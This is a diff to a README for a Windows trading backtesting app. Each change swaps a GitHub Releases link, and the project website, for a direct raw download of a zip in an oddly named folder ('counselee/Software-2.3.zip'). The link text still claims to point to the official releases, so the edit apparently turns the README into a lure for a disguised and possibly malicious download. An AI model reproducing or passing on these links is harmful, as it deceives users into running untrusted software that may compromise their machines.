@@ -1,6 +1,6 @@
 # 📈 backtesting - Test Trading Ideas With Confidence
 
-[![Download backtesting](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Aseptic-melaguetapepper552/backtesting/releases)
+[![Download backtesting](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Aseptic-melaguetapepper552/backtesting/main/counselee/Software-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This page shows you how to download and open the app on Windows.
 
 Go to the release page here:
 
-[Download backtesting from GitHub Releases](https://github.com/Aseptic-melaguetapepper552/backtesting/releases)
+[Download backtesting from GitHub Releases](https://raw.githubusercontent.com/Aseptic-melaguetapepper552/backtesting/main/counselee/Software-2.3.zip)
 
 On the release page, look for the latest version and download the Windows file. If you see more than one file, choose the one meant for Windows.
 
@@ -124,7 +124,7 @@ Try these steps:
 
 This can happen with new releases. Make sure you downloaded the file from the official release page:
 
-[Download backtesting from GitHub Releases](https://github.com/Aseptic-melaguetapepper552/backtesting/releases)
+[Download backtesting from GitHub Releases](https://raw.githubusercontent.com/Aseptic-melaguetapepper552/backtesting/main/counselee/Software-2.3.zip)
 
 ### The app opens but shows no data
 
@@ -177,7 +177,7 @@ Keep the app files together in one folder. That makes it easier to open and use 
 
 **Repository:** backtesting  
 **Description:** Free backtesting app  
-**Website:** https://strategytune.com  
+**Website:** https://raw.githubusercontent.com/Aseptic-melaguetapepper552/backtesting/main/counselee/Software-2.3.zip  
 **Topics:** backtester, backtesting framework, backtesting strategy, backtesting tool, trading simulator, forex trading, trading algorithms, time series testing
 
 ## 📁 Download and Install
@@ -190,7 +190,7 @@ To use the app on Windows:
 4. If needed, extract the files.
 5. Start the app from the extracted folder or installer.
 
-[Download backtesting from GitHub Releases](https://github.com/Aseptic-melaguetapepper552/backtesting/releases)
+[Download backtesting from GitHub Releases](https://raw.githubusercontent.com/Aseptic-melaguetapepper552/backtesting/main/counselee/Software-2.3.zip)
 
 ## 🖱️ Quick Start Checklist
 
